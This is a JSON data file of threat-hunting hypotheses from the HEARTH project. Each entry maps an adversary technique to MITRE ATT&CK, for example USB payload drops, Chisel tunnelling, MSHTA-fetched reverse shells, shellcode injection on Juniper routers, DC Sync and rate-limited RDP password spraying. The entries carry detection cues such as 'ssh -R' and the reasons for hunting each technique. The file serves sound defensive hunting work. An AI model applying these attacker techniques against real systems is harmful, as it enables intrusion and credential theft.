    "title": "Adversaries are using USB devices with malicious payloads, such as Rubber Ducky, to gain initial access to air-gapped OT facilities and ICS networks.",
    "tactic": "Initial Access",
    "notes": "Based on ATT&CK technique T0847. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "initial_access",
      "hardware_additions",
      "air_gap",
      "T0847",
      "T1091",
      "T1200"
    ],
    "techniques": [
      "T0847",
      "T1091",
      "T1200"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- USB devices can be an effective way for adversaries to bridge air gaps and compromise isolated OT/ICS networks\n- Malicious USB payloads like Rubber Ducky can rapidly execute attacker commands on a system with no user interaction required\n- Detecting rogue USB devices is critical for preventing adversaries from establishing an initial foothold in secured environments",
    "references": "- https://attack.mitre.org/techniques/T0847\n- [Source CTI Report](https://dispatch.thorcollective.com/p/purple-teaming-the-fallout-a-red)",
    "file_path": "Flames/H035.md"
  },
  {
    "id": "H036",
    "category": "Flames",
    "title": "Threat actors are using Chisel, an open-source tunneling utility, to create SOCKS proxies on compromised hosts to bypass network security controls and conceal C2 traffic.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1090.001. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defense_evasion",
      "proxy",
      "chisel",
      "T1090.001"
    ],
    "techniques": [
      "T1090.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Chisel proxies allow attackers to hide their true origin and bypass network controls like firewalls\n- Tunneling C2 traffic through a proxy on the victim network helps avoid detection\n- The CL-CRI-1014 cluster is using this technique to maintain stealthy access to financial institutions in Africa",
    "references": "- https://attack.mitre.org/techniques/T1090/001/\n- [Source CTI Report](https://unit42.paloaltonetworks.com/cybercriminals-attack-financial-sector-across-africa)",
    "file_path": "Flames/H036.md"
  },
  {
    "id": "H037",
    "category": "Flames",
    "title": "Threat actors are injecting malicious JavaScript code into legitimate websites that uses JSFireTruck obfuscation composed primarily of the symbols []+${} to hide its true purpose of redirecting search engine traffic to malicious URLs serving malware or other harmful content.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1027. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defense_evasion",
      "obfuscated_files_or_information",
      "javascript",
      "malvertising",
      "T1027"
    ],
    "techniques": [
      "T1027"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- JSFireTruck obfuscation makes malicious JavaScript code difficult to analyze and detect\n- Compromising legitimate websites as watering holes allows threat actors to target many victims\n- Redirecting search engine traffic ensures a steady stream of targets to malicious destinations \n- Malicious URLs can lead to malware downloads, phishing, malvertising, and other threats",
    "references": "- https://attack.mitre.org/techniques/T1027/\n- [JSFireTruck: Exploring Malicious JavaScript Using JSF*ck as an Obfuscation Technique](https://unit42.paloaltonetworks.com/malicious-javascript-using-jsfiretruck-as-obfuscation/)",
    "file_path": "Flames/H037.md"
  },
  {
    "id": "H038",
    "category": "Flames",
    "title": "Threat actors are using PowerShell's Compress-Archive cmdlet to compress stolen victim data into ZIP archives for exfiltration to attacker-controlled servers.",
    "tactic": "Collection",
    "notes": "Based on ATT&CK technique T1560. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "collection",
      "archive_collected_data",
      "powershell",
      "T1560"
    ],
    "techniques": [
      "T1560"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Compressing data allows threat actors to package up large amounts of sensitive information into easy-to-transfer ZIP files\n- Detecting the use of PowerShell to create suspicious ZIP archives can catch attackers in the act of preparing to steal data\n- The KimJongRAT malware specifically uses PowerShell's Compress-Archive to bundle up files like browser data before sending to the C2 server",
    "references": "- https://attack.mitre.org/techniques/T1560/\n- [KimJongRAT Stealer Variant and Its PowerShell Implementation](https://unit42.paloaltonetworks.com/kimjongrat-stealer-variant-powershell/)",
    "file_path": "Flames/H038.md"
  },
  {
    "id": "H039",
    "category": "Flames",
    "title": "Threat actors are crafting TCP SYN packets with anomalous header values like 20-byte header length, zero window size, and zero initial sequence number to scan networks and exploit services while evading detection.",
    "tactic": "Reconnaissance",
    "notes": "Based on ATT&CK technique T1595.001. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "reconnaissance",
      "active_scanning",
      "network_service_scanning",
      "T1595.001"
    ],
    "techniques": [
      "T1595.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Detecting crafted TCP SYN packets with anomalous header values can reveal network scanning and attempts to exploit services\n- Successful scanning enables adversaries to map the network, identify potential targets, and find vulnerable services to compromise  \n- Network scanning is a common precursor to many targeted intrusions and commodity malware infections",
    "references": "- https://attack.mitre.org/techniques/T1595/001/\n- [Decoding TCP SYN for Stronger Network Security](https://www.netscout.com/blog/asert/decoding-tcp-syn-stronger-network-security)",
    "file_path": "Flames/H039.md"
  },
  {
    "id": "H040",
    "category": "Flames",
    "title": "Threat actors are conducting password spray attacks against internet-exposed RDP servers by attempting to authenticate with the same password across multiple domain accounts within a 4-hour window, targeting between 2-10 accounts per minute to evade detection thresholds.",
    "tactic": "Initial Access",
    "notes": "Based on ATT&CK technique T1110.003. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "initial_access",
      "password_spraying",
      "rdp",
      "T1110.003"
    ],
    "techniques": [
      "T1110.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Password spraying against RDP is a common initial access vector that can be difficult to detect when attackers pace their attempts\n- Successful compromise provides attackers with interactive access to internal systems\n- This technique was used by RansomHub operators to gain initial foothold before deploying ransomware\n- The 4-hour timeframe and rate of attempts shows attackers are deliberately trying to stay under common detection thresholds",
    "references": "- [Password Spraying: T1110.003](https://attack.mitre.org/techniques/T1110/003/)\n- [Source CTI Report](https://thedfirreport.com/2025/06/30/hide-your-rdp-password-spray-leads-to-ransomhub-deployment/)",
    "file_path": "Flames/H040.md"
  },
  {
    "id": "H041",
    "category": "Flames",
    "title": "Threat actors are using dd commands to write malicious shellcode directly into the memory of legitimate cat processes at specific offsets (0x4012f0 and 0x602820) to bypass Juniper veriexec protection and execute TINYSHELL backdoors on Juniper routers.",
    "tactic": "Privilege Escalation",
    "notes": "Based on ATT&CK technique T1055. Generated by hearth-auto-intel.",
    "tags": [
      "privilege_escalation",
      "tinyshell",
      "juniper",
      "T1055"
    ],
    "techniques": [
      "T1055"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jocko",
      "link": ""
    },
    "why": "",
    "references": "",
    "file_path": "Flames/H041.md"
  },
  {
    "id": "H042",
    "category": "Flames",
    "title": "Threat actors are using PowerShell's Expand-Archive cmdlet to extract malicious CAB files containing encrypted DEMODEX rootkit configurations and shellcode payloads to C:\\Windows\\debug\\ before deleting the original archive to evade detection.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1140. Generated by hearth-auto-intel.",
    "tags": [
      "defense_evasion",
      "deobfuscate_files",
      "earth_estries",
      "T1140"
    ],
    "techniques": [
      "T1140"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jocko",
      "link": ""
    },
    "why": "- The DEMODEX rootkit is a sophisticated persistence mechanism used by Earth Estries APT group\n- The new infection chain bundles encrypted configurations and shellcode in CAB files that are deleted after extraction to avoid detection\n- This technique allows the attacker to deploy the rootkit while leaving minimal forensic evidence\n- Successful detection could reveal ongoing Earth Estries compromises targeting telecommunications and government entities\n- Part of larger Chinese APT espionage campaigns targeting critical infrastructure globally",
    "references": "- [MITRE ATT&CK T1140: Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/)\n- [Source CTI Report](https://www.trendmicro.com/en_us/research/24/k/earth-estries.html)",
    "file_path": "Flames/H042.md"
  },
  {
    "id": "H043",
    "category": "Flames",
    "title": "Adversaries are modifying Windows Registry Run keys in HKCU\\Software\\CLASSES\\CLSID\\ID to store unique victim identifiers used for tracking C2 communications, deviating from standard CLSID format which requires GUIDs in curly brackets.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1112. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defense_evasion",
      "registry_modification",
      "persistence",
      "T1112"
    ],
    "techniques": [
      "T1112"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Jocko",
      "link": ""
    },
    "why": "- The CLSID registry key structure is highly standardized and requires GUIDs in curly brackets - any deviation from this format is suspicious\n- This specific registry modification provides a reliable way to track FamousSparrow's SparrowDoor backdoor activity\n- The technique allows the malware to maintain consistent tracking across C2 sessions while blending in with legitimate Windows registry entries\n- This behavior is part of FamousSparrow's latest campaign targeting financial sector organizations",
    "references": "- [MITRE ATT&CK T1112: Modify Registry](https://attack.mitre.org/techniques/T1112/)\n- [Source CTI Report](https://www.welivesecurity.com/en/eset-research/you-will-always-remember-this-as-the-day-you-finally-caught-famoussparrow/)",
    "file_path": "Flames/H043.md"
  },
  {
    "id": "H044",
    "category": "Flames",
    "title": "Threat actors are using PowerShell to execute PHP from non-standard AppData locations with specific extension directives to load malicious configuration files and establish RAT persistence on target Windows systems.",
    "tactic": "Execution",
    "notes": "Based on ATT&CK technique T1059.001. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "execution",
      "powershell",
      "rat",
      "T1059.001"
    ],
    "techniques": [
      "T1059.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- PowerShell execution of PHP from non-standard locations represents a highly suspicious behavior that may indicate Interlock RAT activity\n- The specific command pattern using extension directives and config files is distinctive to this campaign\n- This technique serves as the initial execution vector for the Interlock RAT PHP variant\n- Successful detection can identify compromises early in the attack chain before lateral movement occurs\n- Part of a larger Interlock ransomware campaign using the KongTuke/FileFix delivery mechanism",
    "references": "- [MITRE ATT&CK: PowerShell](https://attack.mitre.org/techniques/T1059/001/)\n- [Source CTI Report](https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/)",
    "file_path": "Flames/H044.md"
  },
  {
    "id": "H045",
    "category": "Flames",
    "title": "Threat actors are using MSHTA.exe to download and execute HTA scripts from hardcoded IP addresses (e.g. http://[IP]/[PORT].hta) which contain Base64-encoded PowerShell reverse shell commands to establish persistent C2 connections.",
    "tactic": "Command and Scripting Interpreter",
    "notes": "Based on ATT&CK technique T1218.005. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "execution",
      "mshta",
      "living_off_the_land",
      "T1218.005"
    ],
    "techniques": [
      "T1218.005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- MSHTA.exe is a native Windows binary that can be abused to execute malicious HTA scripts while bypassing security controls\n- The specific pattern of IP/port.hta URLs and Base64 PowerShell payloads is distinctive to this Silent Skimmer campaign\n- Successful detection could identify initial access and persistence mechanisms used by this financially-motivated threat actor\n- This technique was used by Silent Skimmer to establish backdoor access for payment card theft operations",
    "references": "- [MITRE ATT&CK: System Binary Proxy Execution: Mshta](https://attack.mitre.org/techniques/T1218/005/)\n- [Silent Skimmer Gets Loud (Again)](https://unit42.paloaltonetworks.com/silent-skimmer-latest-campaign/)",
    "file_path": "Flames/H045.md"
  },
  {
    "id": "H046",
    "category": "Flames",
    "title": "Evildoers might be using reverse ssh for Command and Control.",
    "tactic": "Command and Control",
    "notes": "Look for processes with \"ssh -R\" and use JA4SSH for TLS/JA4+ fingerprinting.",
    "tags": [
      "commandandcontrol",
      "networktraffic",
      "ssh",
      "linux",
      "windows",
      "T1572"
    ],
    "techniques": [
      "T1572"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "DarkWizardCatcher",
      "link": ""
    },
    "why": "- Aiming for hunting already executed C2 communications in network.\n- If you find something potentially evil it can indicate the host is already compromised and adversary estabilished C2.\n- We have seen adversaries using ssh for C2 communication. For example ALPHA SPIDER or Billbug.\n- We don't see much of JA4 fingerprinting telemetry ingested in SIEMs and using those for detections. Firewalls them self might already be detecting these kind of activities. Even EDR's don't flag ssh clients with -R activities.",
    "references": "https://github.com/FoxIO-LLC/ja4\nhttps://github.com/Fahrj/reverse-ssh\nhttps://attack.mitre.org/techniques/T1572/\nhttps://medium.com/foxio/ja4-network-fingerprinting-9376fe9ca637",
    "file_path": "Flames/H046.md"
  },
  {
    "id": "H047",
    "category": "Flames",
    "title": "Threat actors are using PowerShell's Invoke-WebRequest cmdlet to download encrypted payloads from Discord CDN URLs ending in .dll or .exe to evade network detection and transfer malware to compromised Windows hosts.",
    "tactic": "Command and Control",
    "notes": "Based on ATT&CK technique T1105. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "command_and_control",
      "ingress_tool_transfer",
      "powershell",
      "T1105"
    ],
    "techniques": [
      "T1105"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Discord CDN is a legitimate service commonly abused by threat actors to host malware while blending in with normal traffic\n- PowerShell web requests to Discord CDN URLs downloading .dll/.exe files is highly suspicious behavior\n- This technique allows attackers to bypass traditional file transfer detection methods\n- The encrypted payloads enable malware delivery while evading network security controls\n- This behavior has been observed in recent ransomware campaigns using Bumblebee loader",
    "references": "- [MITRE ATT&CK: Ingress Tool Transfer (T1105)](https://attack.mitre.org/techniques/T1105/)\n- [Source CTI Report](https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira/)",
    "file_path": "Flames/H047.md"
  },
  {
    "id": "H048",
    "category": "Flames",
    "title": "The Cisco AnyConnect Secure Mobility Client updates for macOS are distributed via a download from https://disthost.umbrella.com/roaming/upgrade/mac_anyconnect/production/. The naming convention of the legitimate file is vpndownloader.app under a generated file path, perhaps like: _\"/private/tmp/vpn.<generated-suffix>/vpndownloader.app/Contents/MacOS/vpndownloader\"_. This generically named file / file path may be deemed malicious for several reasons: 1. Location - /private/tmp/ is a temporary directory on macOS, often used for short-lived files. Legitimate apps typically don’t install or run persistent binaries from there. 2. File Name - A generated suffix is often used by droppers or downloaders to avoid detection and to make each infection unique. 3. Binary Path - /Contents/MacOS/vpndownloader means it’s a compiled executable inside an .app bundle. If this were from a reputable VPN provider, it would normally live in /Applications/ or ~/Applications/, not inside /private/tmp Files showing these hallmarks (location, file name, binary path), should be reviewed for validity.",
    "tactic": "Defense Evasion (TA0005), Execution (TA0002), Masquerading (T1036), Signed Binary Proxy Execution (T1218), Ingress Tool Transfer (T1105)",
    "notes": "The legitimacy of the Cisco vpndownloader can be verified by identifying the running process and capturing command-line information.",
    "tags": [
      "defenseevasion",
      "execution",
      "masquerading",
      "proxyexecution",
      "T1036",
      "T1218",
      "T1105"
    ],
    "techniques": [
      "T1036",
      "T1218",
      "T1105"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Joshua Hines",
      "link": ""
    },
    "why": "- The identified hallmarks of location, file name, and binary path may all be indicators of malicious executables.\n- Files/binaries that carry similar hallmarks should be reviewed with scrutiny, especially if their source cannot be verified.",
    "references": "- https://attack.mitre.org/tactics/TA0005/\n- https://attack.mitre.org/tactics/TA0002/\n- https://attack.mitre.org/techniques/T1036/\n- https://attack.mitre.org/techniques/T1218/\nhttps://attack.mitre.org/techniques/T1105/",
    "file_path": "Flames/H048.md"
  },
  {
    "id": "H049",
    "category": "Flames",
    "title": "Adversaries are using mailbox rules to hide their presence within compromised email accounts by automatically deleting, redirecting, or marking messages as read.",
    "tactic": "Defense Evasion, Collection, Initial Access",
    "notes": "Apply a multi-faceted approach to detect malicious mailbox rules.",
    "tags": [
      "defenseevasion",
      "phishing",
      "collection",
      "T1564.008",
      "T1114"
    ],
    "techniques": [
      "T1564.008",
      "T1114"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Bruce Breuer",
      "link": ""
    },
    "why": "- The hunt for malicious mailbox rules that focus on concealing adversary presence addresses both persistence and the risk of internal spearphishing.\n\n- Potential impacts include, but are not limited to: data loss, adversary dwell time, and lateral movement to other services. This risk is increasingly prevalent in environments where audit visibility is limited or mailbox activity is not closely monitored within SaaS platforms.\n\n- This hunt can be valuable across environments of all sizes, helping uncover nefarious activity ranging from everyday business email compromise to more sophisticated campaigns attributed to eCrime groups.",
    "references": "- https://attack.mitre.org/techniques/T1566/ \n- https://attack.mitre.org/techniques/T1564/008/\n- https://attack.mitre.org/techniques/T1114/\n- https://learn.microsoft.com/en-us/defender-xdr/alert-grading-playbook-inbox-manipulation-rules",
    "file_path": "Flames/H049.md"
  },
  {
    "id": "H050",
    "category": "Flames",
    "title": "An adversary successfully obtained AD password hashes by abusing replication permissions through a DC Sync operation.",
    "tactic": "Credential Access",
    "notes": "DC sync attacks leave behind a variety of indicators.",
    "tags": [
      "credentialaccess",
      "activedirectory",
      "identity",
      "secretsdump",
      "T1003.006"
    ],
    "techniques": [
      "T1003.006"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Bruce Breuer",
      "link": ""
    },
    "why": "- The hunt targets credential theft via DC sync attacks, which extract password hashes from domain controllers. Security risks include privilege escalation, lateral movement, and domain compromise. \n- This type of AD hunt delivers visibility into an attack technique that can go unnoticed due to gaps in identity security, especially in environments with limited detections/hardening.",
    "references": "- https://attack.mitre.org/techniques/T1003/006/",
    "file_path": "Flames/H050.md"
  },
  {
    "id": "H051",
    "category": "Flames",
    "title": "Threat actors are establishing persistent backdoor access by deploying Hidden Virtual Network Computing (HVNC) servers that create invisible virtual desktop sessions running outside the user's visible desktop environment, enabling attackers to perform reconnaissance, credential theft, and lateral movement activities without triggering visual alerts or appearing in standard process monitoring tools on compromised developer workstations.",
    "tactic": "Command and Control",
    "notes": "Based on ATT&CK technique T1219. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "commandandcontrol",
      "hvnc",
      "remoteaccess",
      "glassworm",
      "T1219"
    ],
    "techniques": [
      "T1219"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Apramey \"Apps\" S",
      "link": ""
    },
    "why": "- HVNC represents one of the most sophisticated remote access capabilities in the GlassWorm malware, providing attackers with complete invisible control over compromised systems while bypassing traditional detection mechanisms that rely on visible windows or standard process enumeration\n- This technique enables attackers to leverage existing authenticated sessions in browsers and applications to access corporate resources, internal tools, email, and source code repositories without requiring additional credential theft or authentication bypass\n- The invisible nature of HVNC sessions means attackers can conduct extensive reconnaissance, data exfiltration, and lateral movement activities for extended periods without alerting users or triggering security monitoring tools that depend on user-visible indicators\n- Detection of HVNC deployment is critical for identifying advanced persistent threats targeting developer environments, as these systems typically have elevated access to source code repositories, build systems, and production infrastructure\n- GlassWorm's use of HVNC demonstrates the evolution of supply chain attacks beyond simple credential theft toward establishing persistent, invisible command and control channels within enterprise networks",
    "references": "- [MITRE ATT&CK T1219 - Remote Access Software](https://attack.mitre.org/techniques/T1219/)\n- [Source CTI Report](https://www.koi.ai/blog/glassworm-first-self-propagating-worm-using-invisible-code-hits-openvsx-marketplace)",
    "file_path": "Flames/H051.md"
  },
  {
    "id": "H052",
    "category": "Flames",
    "title": "Adversaries are using BackConnect VNC modules injected into dllhost.exe to execute Windows shell commands that open specific Explorer interfaces such as \"shell:mycomputerfolder\" for interactive file system browsing on compromised hosts.",
    "tactic": "Command and Control",
    "notes": "Based on ATT&CK technique T1219. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "command_and_control",
      "backconnect",
      "vnc",
      "dllhost",
      "T1219"
    ],
    "techniques": [
      "T1219"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- BackConnect VNC represents a distinctive post-exploitation capability historically associated with IcedID and now Latrodectus malware families, providing threat actors with interactive remote desktop access that bypasses traditional remote access monitoring\n- This technique enables adversaries to manually browse file systems and identify high-value data for exfiltration while maintaining persistent access, as demonstrated in this intrusion where the threat actor used BackConnect to discover and access the unattend.xml file containing domain administrator credentials\n- The specific command pattern of dllhost.exe spawning explorer.exe with shell URIs is highly anomalous and indicates hands-on-keyboard activity by sophisticated threat actors like Lunar Spider, who maintained access for nearly two months using this capability\n- Detection of this behavior provides early warning of active threat actor reconnaissance and can prevent credential theft and data exfiltration before final impact objectives are achieved",
    "references": "- https://attack.mitre.org/techniques/T1219/\n- [Source CTI Report](https://thedfirreport.com/2025/09/29/from-a-single-click-how-lunar-spider-enabled-a-near-two-month-intrusion/)",
    "file_path": "Flames/H052.md"
  },
  {
    "id": "H053",
    "category": "Flames",
    "title": "Adversaries are using AI-powered tools to autonomously scan network infrastructure and enumerate high-value databases by executing thousands of reconnaissance requests per second against target systems, significantly accelerating the discovery phase of cyber espionage operations.",
    "tactic": "Discovery",
    "notes": "Based on ATT&CK technique T1046. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "discovery",
      "networkscan",
      "ai_powered",
      "T1046"
    ],
    "techniques": [
      "T1046"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- This behavior represents a fundamental shift in reconnaissance operations where AI agents can perform network scanning at speeds impossible for human operators (thousands of requests, often multiple per second), making traditional rate-limiting and anomaly detection less effective\n- Successful automated network service discovery enables threat actors to rapidly identify high-value targets across dozens of organizations simultaneously, as demonstrated in this campaign where 30 global targets were assessed with minimal human intervention\n- This technique is critical to detect because it represents the initial phase of AI-orchestrated espionage campaigns attributed to Chinese state-sponsored groups, where 80-90% of the attack chain operates autonomously after this discovery phase\n- The unprecedented scale and speed of AI-driven reconnaissance fundamentally changes the threat landscape, allowing less experienced threat actors to perform sophisticated multi-target operations previously requiring entire teams of skilled hackers",
    "references": "- [MITRE ATT&CK T1046 - Network Service Discovery](https://attack.mitre.org/techniques/T1046/)\n- [Source CTI Report](https://www.anthropic.com/news/disrupting-AI-espionage)",
    "file_path": "Flames/H053.md"
  },
  {
    "id": "H054",
    "category": "Flames",
    "title": "Threat actors are using compiled AppleScript (.scpt) files with fake document extensions like .docx.scpt and .pptx.scpt, combined with custom icons stored in resource forks, to trick users into executing malicious scripts via Script Editor.app and bypass Gatekeeper quarantine restrictions on macOS systems.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1553.001. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defense_evasion",
      "macos",
      "gatekeeper",
      "applescript",
      "T1553.001"
    ],
    "techniques": [
      "T1553.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- This technique directly bypasses macOS Gatekeeper protections, which is critical since Apple removed the \"right-click and open\" override in August 2024, forcing attackers to adopt new methods\n- The technique has migrated from APT groups (BlueNoroff) to commodity malware families like Odyssey Stealer and MacSync Stealer, indicating widespread adoption and increased threat surface\n- Files delivered via this method can execute quarantined scripts without triggering Gatekeeper warnings, providing a direct path to initial access and execution\n- The use of custom icons and double extensions (.docx.scpt, .pptx.scpt) makes these files highly convincing to end users, increasing successful execution rates\n- Multiple samples show zero detections on VirusTotal, indicating a significant detection gap across security vendors",
    "references": "- [MITRE ATT&CK T1553.001 - Subvert Trust Controls: Gatekeeper Bypass](https://attack.mitre.org/techniques/T1553/001/)\n- [Source CTI Report](https://pberba.github.io/security/2025/11/11/macos-infection-vector-applescript-bypass-gatekeeper/)",
    "file_path": "Flames/H054.md"
  },
  {
    "id": "H055",
    "category": "Flames",
    "title": "Threat actors are using PowerShell's Get-CimInstance cmdlet to query Win32_OperatingSystem and ConvertTo-Csv to extract MainWindowTitle properties from running processes, exfiltrating environment variables under 99 characters, desktop file inventories via Shell.Application COM object, and mounted drive information to perform comprehensive host reconnaissance within 20 minutes of Gootloader JavaScript execution.",
    "tactic": "Discovery",
    "notes": "Based on ATT&CK technique T1082. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "discovery",
      "gootloader",
      "powershell",
      "systeminfo",
      "T1082"
    ],
    "techniques": [
      "T1082"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Anonymous",
      "link": ""
    },
    "why": "- This specific PowerShell reconnaissance pattern occurs within 20 minutes of initial Gootloader infection and represents the earliest detectable post-compromise activity before lateral movement begins\n- The combination of Get-CimInstance Win32_OperatingSystem queries, ConvertTo-Csv parsing for MainWindowTitle extraction, Shell.Application COM object usage for desktop enumeration, and the distinctive 99-character environment variable filter creates a highly specific behavioral signature unique to Gootloader's second-stage payload\n- Detecting this reconnaissance activity provides defenders with a critical 16+ hour window before Domain Controller compromise occurs, as observed in multiple Huntress cases where DC compromise happened 17 hours after initial infection\n- The MainWindowTitle extraction technique is particularly unusual as it reveals sensitive information like open documents and credentials visible in window titles, making it a high-fidelity detection opportunity\n- This activity directly precedes hands-on-keyboard operations by Vanilla Tempest, including Kerberoasting, lateral movement via WinRM, and ransomware deployment, making early detection essential to prevent domain-wide compromise",
    "references": "- https://attack.mitre.org/techniques/T1082/\n- https://www.huntress.com/blog/gootloader-threat-detection-woff2-obfuscation",
    "file_path": "Flames/H055.md"
  },
  {
    "id": "H056",
    "category": "Flames",
    "title": "Adversaries are invalidating active user sessions by revoking OAuth refresh tokens or session cookies through compromised administrative accounts in Microsoft Entra ID, forcing users to reauthenticate and triggering MFA prompts that attackers can then spam to gain persistent access to cloud applications.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1550.001. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defense_evasion",
      "oauth",
      "session_hijacking",
      "T1550.001"
    ],
    "techniques": [
      "T1550.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Azrara",
      "link": "https://www.linkedin.com/in/azrara/"
    },
    "why": "- Session invalidation via administrative token revocation is a precursor to MFA push bombing attacks, allowing adversaries to force fresh authentication flows they can intercept or fatigue-approve\n- Compromised administrative accounts with token revocation privileges enable attackers to systematically invalidate legitimate user sessions across an entire tenant, creating windows for credential replay and session hijacking\n- This technique is particularly dangerous in Business Email Compromise (BEC) campaigns where attackers need to establish persistent access to cloud email and collaboration platforms after initial credential theft\n- Detecting abnormal token revocation patterns from administrative accounts provides early warning before MFA bombing attempts begin, allowing defenders to contain the compromise at the administrative level",
    "references": "- [MITRE ATT&CK T1550.001 - Use Alternate Authentication Material: Application Access Token](https://attack.mitre.org/techniques/T1550/001/)\n- [Source CTI Report](https://medium.com/@oazrara1/stop-mfa-push-bombing-detection-engineering-threat-hunting-that-actually-works-39db912f369b)",
    "file_path": "Flames/H056.md"
  },
  {
    "id": "H057",
    "category": "Flames",
    "title": "Adversaries are executing PowerShell scripts that enumerate all accessible network shares and local drives to identify files containing authentication credentials such as passwords stored in batch files, administrative documents, spreadsheets, and configuration files for subsequent use in password spraying attacks against core banking systems.",
    "tactic": "Discovery",
    "notes": "Based on ATT&CK technique T1135. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "discovery",
      "financial",
      "powershell",
      "T1135"
    ],
    "techniques": [
      "T1135"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Shaimon Weslley",
      "link": "https://www.linkedin.com/in/weslley-s-1540b356/"
    },
    "why": "- Plump Spider uses automated PowerShell scripts to perform extensive scans of network shares specifically to harvest credentials, which represents a critical pivot point between initial access and privilege escalation to core banking systems\n- This technique directly enables the group's password spraying attacks against LDAP-integrated banking platforms by building contextualized wordlists from discovered credentials, dramatically increasing attack success rates\n- Detection of this behavior provides an early warning before attackers gain access to core banking systems, as it occurs in Phase 3 of the attack cycle before the high-impact fraud execution phases\n- The automated and broad nature of these scans creates distinctive patterns in file access logs and PowerShell execution telemetry that are highly detectable when proper monitoring is in place\n- Financial institutions can interrupt the attack chain at this stage before adversaries compile the credential intelligence needed to compromise critical banking infrastructure",
    "references": "- [MITRE ATT&CK T1135 - Network Share Discovery](https://attack.mitre.org/techniques/T1135/)\n- [Source CTI Report](https://medium.com/@thiago_28988/plump-spider-análise-técnica-e-estratégica-de-um-grupo-de-ameaça-avançada-contra-o-setor-6afdd0fd8b3b)",
    "file_path": "Flames/H057.md"
